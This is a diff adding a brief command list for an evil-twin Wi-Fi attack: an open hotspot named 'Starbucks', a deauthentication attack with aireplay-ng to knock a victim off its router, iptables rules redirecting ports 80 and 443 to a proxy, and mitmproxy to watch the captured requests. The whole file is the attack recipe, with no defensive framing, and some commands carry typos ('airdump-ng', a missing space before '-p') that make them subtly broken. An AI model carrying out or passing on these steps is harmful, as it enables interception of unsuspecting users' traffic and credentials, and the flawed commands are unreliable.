@@ -1,0 +1,22 @@
+
+1. Setting up the AP
+$ nmtui
+Edit a connection
+ -> Select Hotspot
+ -> Change SSID to "Starbucks"
+ -> Change password to nothing
+
+2. Forcing the decive to disconnect via a deauthentication attack
+$ iwconfig
+$ airmon-ng start wlan0
+$ airdump-ng wlan0mon
+$ airodump-ng wlan0mon --bssid [routers BSSID here]--channel [routers channel here]
+$ aireplay-ng --deauth 0 -c [DEVICES MAC ADDRESS] -a [ROUTERS MAC ADDRESS] wlan0mon
+
+3. Proxying requests through
+$ sysctl -w net.ipv4.ip_forward=1
+$ iptables -t nat -A PREROUTING -i wlan0-p tcp --dport 80 -j REDIRECT --to-port 8080
+$ iptables -t nat -A PREROUTING -i wlan0-p tcp --dport 443 -j REDIRECT --to-port 8080
+
+4. Monitoring requests
+$ mitmproxy -T --host
